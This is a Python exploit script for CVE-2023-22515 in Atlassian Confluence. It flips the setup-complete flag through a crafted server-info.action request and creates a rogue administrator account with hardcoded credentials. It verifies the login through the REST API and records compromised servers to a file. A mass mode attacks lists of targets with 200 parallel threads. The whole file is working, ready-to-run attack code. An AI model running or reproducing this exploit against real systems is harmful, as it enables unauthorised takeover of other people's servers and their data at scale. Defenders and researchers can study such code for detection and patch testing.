import json
import fire
import requests
from rich import print
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor

HEADERS = {
    "X-Atlassian-Token": "no-check",
    "User-Agent": "https://github.com/Chocapikk/CVE-2023-22515"
}

requests.packages.urllib3.disable_warnings()

USERNAME = "adminxxyz"
PASSWORD = "Admin@12345"

def send_request(method, url, auth=None, data=None, verbose=False):
    try:
        response = requests.request(method, url, headers=HEADERS, verify=False, timeout=3, auth=auth, data=data)
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[[bold red]ERROR[/bold red]] Request error for {url}: {str(e)}")
        return None, None

def check_authentication(base_url, verbose=False):
    auth = (USERNAME, PASSWORD)
    url = f"{base_url}/rest/api/user?username={USERNAME}"
    status, response = send_request("GET", url, auth=auth, verbose=verbose)
    
    if status == 200:
        try:
            user_info = json.loads(response.strip())
            formatted_user_info = json.dumps(user_info, indent=2)
            if verbose:
                print(f"[bold green][*][bold white] Authenticated as \"{USERNAME}\" user\n")
                print(f"[[bold yellow]INFO[/bold yellow]]  User Information: [white]{formatted_user_info}")
        except json.JSONDecodeError:
            return False
        return True
    else:
        if verbose:
            print(f"[bold red][-][/bold red] Authentication failed on REST API for {USERNAME}")
        return False

def trigger_vulnerability(base_url):
    status, _ = send_request("GET", f"{base_url}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")
    return status == 200

def create_admin_account(base_url, verbose=False, output_file=None):
    data = {
        "username": USERNAME,
        "fullName": USERNAME,
        "email": f"{USERNAME}@localhost",
        "password": PASSWORD,
        "confirm": PASSWORD,
        "setup-next-button": "Next"
    }

    status, response = send_request("POST", f"{base_url}/setup/setupadministrator.action", data=data, verbose=verbose)

    if status == 200:
        if verbose:
            print(f"[[bold yellow]INFO[/bold yellow]] Username: {USERNAME}")
            print(f"[[bold yellow]INFO[/bold yellow]] Password: {PASSWORD}")
        
        if "Setup Successful" in response:
            if verbose:
                print("[bold green][*][bold white] Created new administrator successfully")
            save_to_output_file(base_url, output_file)

        elif "A user with this username already exists" in response:
            if verbose:
                print("[bold yellow][!][bold white] Administrator with this username already exists")
            save_to_output_file(base_url, output_file)
        else:
            if verbose:
                print(f"[bold red][-][/bold red] Failed to create a new administrator for {base_url}")
    
    return status == 200

def save_to_output_file(base_url, output_file):
    if output_file:
        with open(output_file, 'a') as file:
            file.write(f"Vulnerable server: {base_url} | Username: {USERNAME} | Password: {PASSWORD}\n")

def exploit(base_url, verbose=False, output_file=None):
    if not trigger_vulnerability(base_url):
        print(f"[bold red][-][/bold red] Failed to trigger vulnerability for {base_url}")
        return
    if not create_admin_account(base_url, verbose, output_file):
        print(f"[bold red][-][/bold red] Failed to create a new administrator for {base_url}")
        return
    if check_authentication(base_url, verbose):
        print(f"[bold green][*][bold white] Successfully exploited {base_url} and logged in as admin!")
    else:
        print(f"[bold red][-][/bold red] Failed to authenticate with created admin account at {base_url}")

def normal(target, output_file=None):
    exploit(target, verbose=True, output_file=output_file)

def mass(filename, output_file=None):
    with open(filename, 'r') as file:
        targets = [line.strip() for line in file.readlines() if line.strip()]
    scan_targets(targets, output_file=output_file)

def scan_targets(targets, output_file=None):
    with alive_bar(len(targets), enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=200) as executor:
            list(executor.map(lambda url: exploit(url, output_file=output_file), targets))
            bar()

if __name__ == "__main__":
    fire.Fire({"normal": normal, "mass": mass})
